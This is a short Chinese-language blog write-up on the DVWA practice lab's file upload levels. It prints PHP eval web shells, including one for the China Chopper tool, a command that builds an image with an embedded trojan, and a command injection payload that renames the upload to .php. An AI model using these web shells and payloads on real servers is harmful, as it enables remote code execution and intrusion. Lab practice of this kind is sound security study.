---
layout: post
title: File Upload
subtitle: File Upload
date: 2023-08-01 23:00
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
  - DVWA
  - 靶场实战
published: true
---
# 文件上传漏洞
### LOW

the.php

```php
<?php eval($_GET['bckdor'])?> 
```

构造url: http://192.168.30.131/dvwa/hackable/uploads/the.php?bckdor=

```php
phpinfo(); 
system('ls'); 
```

**中国菜刀**

```php
<?php eval($_POST['bckdor'])?>
```
### MEDIUM

将the.php改为the.jpg

![image.png](https://img.ghostliner.top/vt5Xwv.png)


burpsuit抓取request，修改文件后缀
### HIGH

准备图片image.png和hack.php

```shell
#生成带有木马的图片
#image.png/b中“b”表示“二进制文件”，hack.php/a中“a"表示ASCII码文件
copy image.jpg/b+hack.php/a hack.jpg
```

利用Command Injection

```
127.0.0.1|mv ../../hackable/uploads/hack.jpg ../../hackable/uploads/hack.php
```